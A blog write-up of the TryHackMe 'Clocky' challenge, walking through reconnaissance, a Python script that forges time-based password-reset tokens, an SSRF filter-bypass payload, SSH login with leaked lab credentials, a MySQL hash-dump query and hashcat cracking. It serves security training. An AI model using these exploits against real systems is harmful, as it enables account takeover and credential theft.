<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>THM: Clocky</title>
<meta name=description content="Platform: TryHackMe Link: Clocky Level: Medium OS: Linux For this challenge our objective is to locate six flags. Our inital step involves examining the …"><meta name=keywords content="TryHackMe"><meta property="og:url" content="https://scorpiosec.com/posts/thm-clocky/"><meta property="og:type" content="website"><meta property="og:title" content="THM: Clocky"><meta property="og:description" content="Platform: TryHackMe Link: Clocky Level: Medium OS: Linux For this challenge our objective is to locate six flags. Our inital step involves examining the …"><meta property="og:image" content="https://scorpiosec.com/images/THM-Clocky/clocky.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/THM-Clocky/clocky.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="THM: Clocky"><meta name=twitter:description content="Platform: TryHackMe Link: Clocky Level: Medium OS: Linux For this challenge our objective is to locate six flags. Our inital step involves examining the …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/thm-clocky/"><meta property="twitter:url" content="https://scorpiosec.com/posts/thm-clocky/"><meta name=twitter:image content="https://scorpiosec.com/images/THM-Clocky/clocky.png"><link rel=canonical href=https://scorpiosec.com/posts/thm-clocky/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/thm-clocky/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>THM: Clocky</h1><small role=doc-subtitle></small><p class=post-date>7 min read |
<span class=post-date>April 10, 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/tryhackme>TryHackMe</a></li></ul></div><div class=post-content><ul><li>Platform: TryHackMe</li><li>Link: <a href=https://tryhackme.com/r/room/clocky>Clocky</a></li><li>Level: Medium</li><li>OS: Linux</li></ul><hr><p>For this challenge our objective is to locate six flags. Our inital step involves examining the <code>robots.txt</code> file which contains some file extensions. By fuzzing with those file extensions we obtain an archive and extracting it yields the source code of an application. Upon reviewing the code we identify a way to manipulate the application&rsquo;s password reset mechanism, granting us access to the administrative dashboard.</p><p>The dashboard presents a form vulnerable to Server-Side Request Forgery (SSRF), enabling us to acquire a file with plaintext passwords. By combining the user names we enumerate and the passwords, we get an initial foothold into the system via SSH.</p><p>Further exploration reveals a mysql database; however attempting to read one of its table&rsquo;s content produces some indecipherable output because of the <code>cache_sha2_password</code> plugin&rsquo;s encryption. Eventually, using a meticulously crafted query, we successfully dump the password hashes in a legible format and after cracking them we get the root password.</p><p>Target IP - <code>10.10.62.39</code></p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>nmap -sC -sV -oA nmap/Clocky 10.10.62.39
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-04-09 22:51 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.62.39
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.18s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>997</span> closed tcp ports <span style=color:#56b6c2>(</span>conn-refused<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>3072</span> d9:42:e0:c0:d0:a9:8a:c3:82:65:ab:1e:5c:9c:0d:ef <span style=color:#56b6c2>(</span>RSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> ff:b6:27:d5:8f:80:2a:87:67:25:ef:93:a0:6b:5b:59 <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> e1:2f:4a:f5:6d:f1:c4:bc:89:78:29:72:0c:ec:32:d2 <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>80/tcp   open  http    Apache httpd 2.4.41
</span></span><span style=display:flex><span>|_http-title: <span style=color:#d19a66>403</span> Forbidden
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.41 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>8000/tcp open  http    nginx 1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| http-robots.txt: <span style=color:#d19a66>3</span> disallowed entries 
</span></span><span style=display:flex><span>|_/*.sql$ /*.zip$ /*.bak$
</span></span><span style=display:flex><span>|_http-title: <span style=color:#d19a66>403</span> Forbidden
</span></span><span style=display:flex><span>Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 55.02 seconds
</span></span></code></pre></div><p>We find three ports open 22 (SSH), 80 (HTTP - Apache) and 8000 (HTTP - Nginx). Both web servers seems to return a 403 status code.</p><h2 id=flag-1>Flag 1</h2><p>Both <code>http://10.10.62.39/</code> and <code>http://10.10.62.39:8000/</code> return <code>403 Fordbidden</code> as we could see in nmap.</p><p><img src=/images/THM-Clocky/Apache-403.png alt="Apache 403 error"></p><p><img src=/images/THM-Clocky/Nginx-403.png alt="Nginx 403 error"></p><p>From the nmap output we can see that the service on port 8000 has some disallowed entries for <code>robots.txt</code>. Visiting <code>http://10.10.62.39:8000/robots.txt</code>, we find a list of those same entries and flag 1.</p><p><img src=/images/THM-Clocky/flag1.png alt="Clocky Flag 1"></p><pre tabindex=0><code>THM{14b45bb9eefdb584b79063eca6a31b7a}
</code></pre><hr><h2 id=flag-2>Flag 2</h2><p>Directory enumeration on the first web server with gobuster is unfruitful, we switch to ffuf to fuzz for files.</p><p>We fuzz for all the extensions mentioned in <code>robots.txt</code>. Only <code>.zip</code> returns a result and we find <code>index</code>.</p><pre tabindex=0><code>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -u http://10.10.62.39:8000/FUZZ.zip
</code></pre><p><img src=/images/THM-Clocky/ffuf-zip.png alt="File fuzzing results"></p><p>We get a file called <code>index.zip</code> after going to <code>http://10.10.62.39:8000/index.zip</code> and extracting the archive gives us flag 2.</p><p><img src=/images/THM-Clocky/flag2.png alt="Clocky Flag 2"></p><pre tabindex=0><code>THM{1d3d62de34a3692518d03ec474159eaf}
</code></pre><hr><h2 id=flag-3>Flag 3</h2><p>The archive also contains a python file <code>app.py</code>, which appears to be the source code for a Flask application. At the end of the code we see that the app is running on port <code>8080</code>.</p><p><img src=/images/THM-Clocky/flask-app-8080.png alt="Flask app on port 8080"></p><p>Navigating to <code>http://10.10.62.39:8080/</code> we get to a static website.</p><p><img src=/images/THM-Clocky/clocky-website.png alt="Clocky website on port 8080"></p><p>In the source code we find multiple endpoints such as:</p><ul><li><code>/administrator</code> which has a login form.</li></ul><p><img src=/images/THM-Clocky/administrator.png alt="Clocky administrator endpoint"></p><ul><li><code>/forgot_password</code> which allows to reset a password after the user provides a valid username.</li></ul><p><img src=/images/THM-Clocky/password-reset.png alt="Clocky forgot_password endpoint"></p><ul><li><code>/password_reset</code>, this endpoint leads to a page with the message <code>Invalid Parameter</code>. In the code we see that we need to provide a token value.</li></ul><p><img src=/images/THM-Clocky/pwd_reset.png alt="Clocky forgot_password endpoint"></p><p><img src=/images/THM-Clocky/token-expected.png alt="Clocky token value expected"></p><p>Moreover the generation of the token is time sensitive. Here is how it works:</p><ul><li>once the application confirms that the user name provided exists in the database it gets the server&rsquo;s current date and time and stores it in <code>value</code>.</li><li><code>value</code> is then converted into a string and the last 4 characters are removed. A space, a dot and the upper case version of the user name are then appended to the string.</li><li>the <code>lnk</code> string is finally hashed using SHA-1 (which is insecure).</li></ul><p><img src=/images/THM-Clocky/token-gen-code.png alt="Clocky token value expected"></p><p>So to exploit it we have to:</p><ul><li>provide a valid username</li><li>sync our date and time with the server&rsquo;s</li><li>generate a valid token value</li><li>reset the password of the adminstrator account</li></ul><p>We use the script below to achieve it.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>datetime</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>hashlib</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>requests</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>re</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#7f848e># Set the target URL, change the IP acordingly</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>base_url</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>&#39;http://10.10.62.39:8080/&#39;</span> 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#7f848e># Send a POST request to synchronize time</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>data</span> <span style=color:#56b6c2>=</span> {<span style=color:#98c379>&#34;username&#34;</span>: <span style=color:#98c379>&#34;administrator&#34;</span>}
</span></span><span style=display:flex><span><span style=color:#e06c75>requests</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>post</span>(<span style=color:#e06c75>base_url</span> <span style=color:#56b6c2>+</span> <span style=color:#98c379>&#34;forgot_password&#34;</span>, <span style=color:#e06c75>data</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>data</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#7f848e># Send a GET request to fetch the current time</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>response</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>requests</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>get</span>(<span style=color:#e06c75>base_url</span>)
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#e06c75>response</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>status_code</span> <span style=color:#56b6c2>==</span> <span style=color:#d19a66>200</span>:
</span></span><span style=display:flex><span>    <span style=color:#e06c75>time_pattern</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>r</span><span style=color:#98c379>&#39;The current time is (\d</span><span style=color:#98c379>{4}</span><span style=color:#98c379>-\d</span><span style=color:#98c379>{2}</span><span style=color:#98c379>-\d</span><span style=color:#98c379>{2}</span><span style=color:#98c379> \d</span><span style=color:#98c379>{2}</span><span style=color:#98c379>:\d</span><span style=color:#98c379>{2}</span><span style=color:#98c379>:\d</span><span style=color:#98c379>{2}</span><span style=color:#98c379>)&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>match</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>re</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>search</span>(<span style=color:#e06c75>time_pattern</span>, <span style=color:#e06c75>response</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>text</span>)
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> <span style=color:#c678dd>match</span>:
</span></span><span style=display:flex><span>        <span style=color:#e06c75>current_time_str</span> <span style=color:#56b6c2>=</span> <span style=color:#c678dd>match</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>group</span>(<span style=color:#d19a66>1</span>)
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;Synchronized time:&#34;</span>, <span style=color:#e06c75>current_time_str</span>)  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#7f848e># Generate and check valid tokens</span>
</span></span><span style=display:flex><span>        <span style=color:#e06c75>valid_tokens</span> <span style=color:#56b6c2>=</span> []
</span></span><span style=display:flex><span>        <span style=color:#c678dd>for</span> <span style=color:#e06c75>ms</span> <span style=color:#56b6c2>in</span> <span style=color:#e5c07b>range</span>(<span style=color:#d19a66>100</span>):
</span></span><span style=display:flex><span>            <span style=color:#e06c75>ms_str</span> <span style=color:#56b6c2>=</span> <span style=color:#e5c07b>str</span>(<span style=color:#e06c75>ms</span>)<span style=color:#56b6c2>.</span><span style=color:#e06c75>zfill</span>(<span style=color:#d19a66>2</span>)  
</span></span><span style=display:flex><span>            <span style=color:#e06c75>token_data</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>current_time_str</span> <span style=color:#56b6c2>+</span> <span style=color:#98c379>&#34;.&#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e06c75>ms_str</span> <span style=color:#56b6c2>+</span> <span style=color:#98c379>&#34; . &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#98c379>&#34;administrator&#34;</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>upper</span>()
</span></span><span style=display:flex><span>            <span style=color:#e06c75>hashed_token</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>hashlib</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>sha1</span>(<span style=color:#e06c75>token_data</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>encode</span>(<span style=color:#98c379>&#34;utf-8&#34;</span>))<span style=color:#56b6c2>.</span><span style=color:#e06c75>hexdigest</span>()
</span></span><span style=display:flex><span>            <span style=color:#e06c75>response</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>requests</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>get</span>(<span style=color:#e06c75>base_url</span> <span style=color:#56b6c2>+</span> <span style=color:#98c379>&#39;password_reset&#39;</span>, <span style=color:#e06c75>params</span><span style=color:#56b6c2>=</span>{<span style=color:#98c379>&#39;token&#39;</span>: <span style=color:#e06c75>hashed_token</span>})
</span></span><span style=display:flex><span>            <span style=color:#c678dd>if</span> <span style=color:#98c379>&#39;&lt;h2&gt;Invalid token&lt;/h2&gt;&#39;</span> <span style=color:#56b6c2>not</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>response</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>text</span>:
</span></span><span style=display:flex><span>                <span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#39;Generated token: </span><span style=color:#98c379>{</span><span style=color:#e06c75>hashed_token</span><span style=color:#98c379>}</span><span style=color:#98c379>&#39;</span>) 
</span></span><span style=display:flex><span>                <span style=color:#e06c75>valid_tokens</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>append</span>(<span style=color:#e06c75>hashed_token</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;Generated tokens:&#34;</span>, <span style=color:#e06c75>valid_tokens</span>) 
</span></span><span style=display:flex><span>    <span style=color:#c678dd>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;Error: Could not parse server time from response.&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#c678dd>else</span>:
</span></span><span style=display:flex><span>    <span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;Error: Failed to fetch server response.&#34;</span>)
</span></span></code></pre></div><p>Go to <code>/forgot_password</code> and input administrator.</p><p><img src=/images/THM-Clocky/admin-reset.png alt="administrator account reset"></p><p>After running the script we get a token value that we need to add to <code>/password_reset</code>.</p><p><img src=/images/THM-Clocky/clocky-py.png alt="python script to generate valid token values"></p><pre tabindex=0><code>10.10.62.39:8080/password_reset?token=2233b063a0ebf5505e2cf32a7fa79937d9b561ed
</code></pre><p>Our token value is correct and we are able to reset the password of the user <code>administrator</code>.</p><p><img src=/images/THM-Clocky/pwd-reset-success.png alt="password reset success"></p><p>Going back to <code>/dashboard</code> we can login with <code>administrator:Password_you_picked</code> and we get the flag 3.</p><pre tabindex=0><code>THM{ee68e42f755f6ebbcd89439432d7b462}
</code></pre><p><img src=/images/THM-Clocky/admin-dashboard.png alt="admin dashboard"></p><hr><h2 id=flag-4>Flag 4</h2><p>On the Administrator Dashboard we can submit a <code>Location</code> and download a file. After capturing the request with Burp Suite we can see that it uses the <code>location</code> parameter.</p><p>It turns out to be vulnerable to SSRF.</p><blockquote><p>&ldquo;A <strong>Server-side Request Forgery (SSRF)</strong> vulnerability occurs when an attacker manipulates a <strong>server-side application</strong> into making <strong>HTTP requests</strong> to a domain of their choice. This vulnerability exposes the server to arbitrary external requests directed by the attacker.&rdquo; Source - <a href=https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery>hacktricks</a></p></blockquote><p>We can find plenty of payloads on <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md#bypassing-filters>PayloadsAllTheThings</a>. I used <code>http://127.0.0.1:80</code> but it fails and we get <code>Action not permitted</code> in the response, implying that there is a filter that we need to bypass.</p><p><img src=/images/THM-Clocky/SSRF.png alt="SSRF test"></p><p>I found a SSRF cheat sheet <a href=https://highon.coffee/blog/ssrf-cheat-sheet/>here</a> and the payload <code>http://0x7f000001/</code> works.</p><p><img src=/images/THM-Clocky/SSRF-payload.png alt="SSRF working payload"></p><p>At the beginning of the source code you can see the comment to execute <code>datbase.sql</code>. We use that for the file name and get a hit with the value for the flag 4.</p><p><img src=/images/THM-Clocky/db-sql.png alt="database.sql file comment"></p><p><img src=/images/THM-Clocky/flag4.png alt="Flag 4"></p><pre tabindex=0><code>THM{350020dc1a53e50e1e92bac2c35dd0a2}
</code></pre><p>After forwarding the request we get a file called <code>file.txt</code>.</p><hr><h2 id=flag-5>Flag 5</h2><blockquote><p>The hint for this flag is &ldquo;Have you gathered any usernames yet?&rdquo;</p></blockquote><p><code>file.txt</code> leaks the password <code>Th1s_1s_4_v3ry_s3cur3_p4ssw0rd</code> and the username <code>clocky_user</code>. The source code only mentions two other names <code>jane</code> and <code>clarice</code>.</p><p>After trying the password with the different users we are able to login via SSH with <code>clarice:Th1s_1s_4_v3ry_s3cur3_p4ssw0rd</code> and grab flag 5.</p><p><img src=/images/THM-Clocky/flag5.png alt="Flag 5"></p><pre tabindex=0><code>THM{e57dfa35e62d518cfd215dd7729d0877}
</code></pre><hr><h2 id=flag-6>Flag 6</h2><p>In <code>/home/clarice/app</code> we find the hidden file <code>.env</code> which reveals the database password <code>seG3mY4F3tKCJ1Yj</code>.</p><p><img src=/images/THM-Clocky/db-pwd.png alt="database password"></p><p>The result of <code>ss -lntp</code> confirms that MySQL is running on the server.</p><p><img src=/images/THM-Clocky/services-intern.png alt="Internal services running"></p><p>Using <code>clocky_user:seG3mY4F3tKCJ1Yj</code> we connect to MySQL.</p><pre tabindex=0><code>mysql -u clocky_user -p
</code></pre><p>The <code>clocky</code> database only contains the credentials of the <code>administrator</code> user.</p><p>In the <code>mysql</code> database we find a <code>user</code> table.</p><p><img src=/images/THM-Clocky/mysql-db.png alt="mysql database"></p><p>The query <code>select * from user</code> produced some illegible output.</p><blockquote><p>If you pay close attention, you can actually grab a password hash from the output but I doubt this is the intended way to get the flag.</p></blockquote><p><img src=/images/THM-Clocky/user-output.png alt="sql query output"></p><p>In the output we repeatedly see <code>caching_sha2_password</code> which is an authentication plugin using sha256.</p><p>Searching <code>how to dump mysql sha256 hashes with caching_sha2_password?</code> on Google we find this <a href="https://github.com/hashcat/hashcat/issues/2305?source=post_page-----10e08ab0f1e9--------------------------------">hashcat issue page</a> where we can find multiple queries to achieve our goal.</p><pre tabindex=0><code>SELECT user, CONCAT(&#39;$mysql&#39;,LEFT(authentication_string,6),&#39;*&#39;,INSERT(HEX(SUBSTR(authentication_string,8)),41,0,&#39;*&#39;)) AS hash FROM user WHERE plugin = &#39;caching_sha2_password&#39; AND authentication_string NOT LIKE &#39;%INVALIDSALTANDPASSWORD%&#39;;
</code></pre><p><img src=/images/THM-Clocky/hashes-dump.png alt="hashes dump"></p><p>The first <code>dev</code> password hash gives the password <code>armadillo</code>.</p><pre tabindex=0><code>hashcat -m 7401 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
</code></pre><p>Using the newly found password we are able to connect as root and grab flag 6 in <code>/root</code> and that&rsquo;s all of them!</p><p><img src=/images/THM-Clocky/flag6.png alt="Flag 6"></p><p>This challenge was pretty interesting and I hope my write up was useful to you. I think knowing Python is becoming more and more valuable for technical security professionals and taking the time to learn it will probably pay massive dividends in the future. You can read Automate the Boring Stuff with Python by Al Sweigart for free <a href=http://automatetheboringstuff.com/2e/>here</a>.</p></div><div class=prev-next><div class=prev-post><p><a href=/posts/htb-codify/>&#8592;
Previous:
HTB: Codify</a></p><p class=prev-post-date>April 5, 2024</p></div><div class=next-post><p><a href=/posts/thm-creative/>Next:
THM: Creative
&#8594;</a></p><p class=next-post-date>April 17, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#flag-1>Flag 1</a></li><li><a href=#flag-2>Flag 2</a></li><li><a href=#flag-3>Flag 3</a></li><li><a href=#flag-4>Flag 4</a></li><li><a href=#flag-5>Flag 5</a></li><li><a href=#flag-6>Flag 6</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>